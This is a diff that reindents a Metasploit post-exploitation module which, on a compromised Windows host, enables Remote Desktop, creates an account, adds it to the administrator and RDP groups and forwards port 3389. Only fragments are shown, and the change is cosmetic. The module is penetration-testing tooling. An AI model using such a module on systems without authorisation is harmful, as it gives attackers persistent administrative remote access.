@@ -24,17 +24,18 @@ class Metasploit3 < Msf::Post
 	
 	def initialize(info={})
 		super( update_info( info,
-				'Name'          => 'Windows Manage Enable Remote Desktop',
-				'Description'   => %q{
-						This module enables the Remote Desktop Service (RDP). It provides the options to create
-					an account and configure it to be a member of the Local Administrators and
-					Remote Desktop Users group. It can also forward the target's port 3389/tcp.},
-				'License'       => BSD_LICENSE,
-				'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
-				'Version'       => '$Revision$',
-				'Platform'      => [ 'windows' ],
-				'SessionTypes'  => [ 'meterpreter' ]
-			))
+			'Name'          => 'Windows Manage Enable Remote Desktop',
+			'Description'   => %q{
+					This module enables the Remote Desktop Service (RDP). It provides the options to create
+				an account and configure it to be a member of the Local Administrators and
+				Remote Desktop Users group. It can also forward the target's port 3389/tcp.},
+			'License'       => BSD_LICENSE,
+			'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
+			'Version'       => '$Revision$',
+			'Platform'      => [ 'windows' ],
+			'SessionTypes'  => [ 'meterpreter' ]
+		))
+
 		register_options(
 			[
 				OptString.new('USERNAME', [ false, 'The username of the user to create.' ]),
@@ -43,20 +44,18 @@ class Metasploit3 < Msf::Post
 				OptBool.new(  'FORDWARD', [ false, 'Forward remote port 3389 to local Port.', false]),
 				OptInt.new(   'LPORT',    [ false,  'Local port to fordward remote connection.', 3389])
 			], self.class)
-
 	end
 
 	def run
 		if datastore['ENABLE'] or (datastore['USERNAME'] and datastore['PASSWORD'])
 			cleanup_rc = store_loot("host.windows.cleanup.enable_rdp", "text/plain", session,"" ,
 						"enable_rdp_cleanup.rc", "enable_rdp cleanup resource file")
-	
+
 			if datastore['ENABLE']
 				enablerd(cleanup_rc)
 				enabletssrv(cleanup_rc)
 			end
 			if datastore['USERNAME'] and datastore['PASSWORD']
-
 				addrdpusr(datastore['USERNAME'], datastore['PASSWORD'],cleanup_rc)
 			end
 			if datastore['FORDWARD']
@@ -83,7 +82,6 @@ class Metasploit3 < Msf::Post
 		rescue::Exception => e
 			print_status("The following Error was encountered: #{e.class} #{e}")
 		end
-
 	end
 
 
@@ -117,7 +115,6 @@ class Metasploit3 < Msf::Post
 
 		rdu = resolve_sid("S-1-5-32-555")[:name]
 		admin = resolve_sid("S-1-5-32-544")[:name]
-
 
 		print_status "Setting user account for logon"
 		print_status "\tAdding User: #{username} with Password: #{password}"
